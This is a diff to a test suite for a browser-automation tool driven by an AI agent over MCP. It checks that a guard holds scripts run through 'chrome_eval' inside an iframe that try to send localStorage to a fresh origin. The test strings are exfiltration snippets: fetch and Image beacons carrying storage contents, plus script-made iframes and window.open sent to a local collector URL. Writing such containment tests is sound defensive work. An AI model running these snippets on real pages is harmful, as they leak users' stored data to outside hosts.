@@ -74,6 +74,8 @@ function mcpClient(child) {
 
 async function main() {
   const args = parseArgs(process.argv.slice(2));
+  // DNR alone (Fetch off in the product under the test flag and a temp profile): the same stage must still see zero requests at the server. The eval is then not reported held (the Fetch layer is what reports).
+  const NOFETCH = process.env.VYRE_CHROME_TEST_NOFETCH === "1";
   const headless = args.headless === "false" ? false : typeof args.headless === "string" ? args.headless : "new";
   const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-fs-"));
   const udd = path.join(tmp, "profile"); fs.mkdirSync(udd);
@@ -310,7 +312,7 @@ async function main() {
         for (let n = 0; n < 8; n++) {
           leak = await step("an eval inside the iframe sends localStorage to a fresh origin" + (n ? ` (again ${n})` : ""), () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(leakTo)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(leakTo)} + 'img'; return 1; })()` }));
           console.log("[frames-suite] EGRESS " + JSON.stringify({ n, held: leak.held, contained: leak.contained, why: String(leak.why || "").slice(0, 160), ...(leak.diag ? { paused: leak.diag.paused, probe: leak.diag.probe } : {}) }));
-          need(leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held (run ${n}): ${short(leak)} (the guard covers the top page only)`);
+          need(NOFETCH || leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held (run ${n}): ${short(leak)} (the guard covers the top page only)`);
           await sleep(300);
           const got = (await state()).collected;
           if (got.length !== before) {
@@ -332,12 +334,15 @@ async function main() {
           "frame attached mid-script": `(async () => { const f = document.createElement('iframe'); f.srcdoc = "<script>fetch('" + ${L} + "late').catch(function () {});<\/script>"; document.body.appendChild(f); await new Promise(function (r) { setTimeout(r, 600); }); return 1; })()`,
           "script-made iframe src=fresh": `(async () => { const f = document.createElement('iframe'); f.src = ${L} + 'frame'; document.body.appendChild(f); await new Promise(function (r) { setTimeout(r, 400); }); return 1; })()`,
           "second eval fetches fresh after that iframe": `(async () => { try { await fetch(${L} + 'second'); } catch (e) {} return 1; })()`,
+          "iframe Image": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { new f.contentWindow.Image().src = ${L} + 'iframeimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()`,
+          "own-frame Image": `(async () => { try { new Image().src = ${L} + 'ownimage'; } catch (e) {} await new Promise(r => setTimeout(r, 300)); return 1; })()`,
           "window.open": `(() => { try { window.open(${L} + 'open'); } catch (e) {} return 1; })()`,
         });
         for (const [name, expression] of Object.entries(escapes)) {
           const r = await step(`escape attempt: ${name}`, () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression }));
-          console.log("[frames-suite] ESCAPE " + JSON.stringify({ name, held: r.held, contained: r.contained, why: String(r.why || r.error || "").slice(0, 140) }));
+          console.log("[frames-suite] ESCAPE " + JSON.stringify({ name, held: r.held, contained: r.contained, why: String(r.why || r.error || "").slice(0, 140), ...(r.diag ? { diag: JSON.stringify(r.diag).slice(0, 1500) } : {}), ...(r.egress ? { egress: JSON.stringify(r.egress).slice(0, 400) } : {}) }));
           await sleep(500);
+          if ((await state()).collected.length !== before) { try { const nl = await mcp.call("chrome_net", { action: "list", tab, limit: 1 }); console.log("[frames-suite] ESCAPE LEAKED GUARD " + JSON.stringify({ name, lastGuard: nl.lastGuard })); const got = (await state()).collected; console.log("[frames-suite] ESCAPE LEAKED SERVER " + JSON.stringify(got.slice(before).map((/** @type {any} */ c) => JSON.stringify(c).slice(0, 300)))); } catch (e) { console.log("[frames-suite] ESCAPE LEAKED diag failed " + String(e && e.message || e).slice(0, 200)); } }
           need((await state()).collected.length === before, "eval.frame.guard", `escape "${name}" reached the fresh origin (${(await state()).collected.length - before} request(s)): ${short(r)}`);
         }
         const own = await step("the iframe's own API call is not held", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__api('GET', '/api/workflows').then(function (r) { return r.status; })" }));
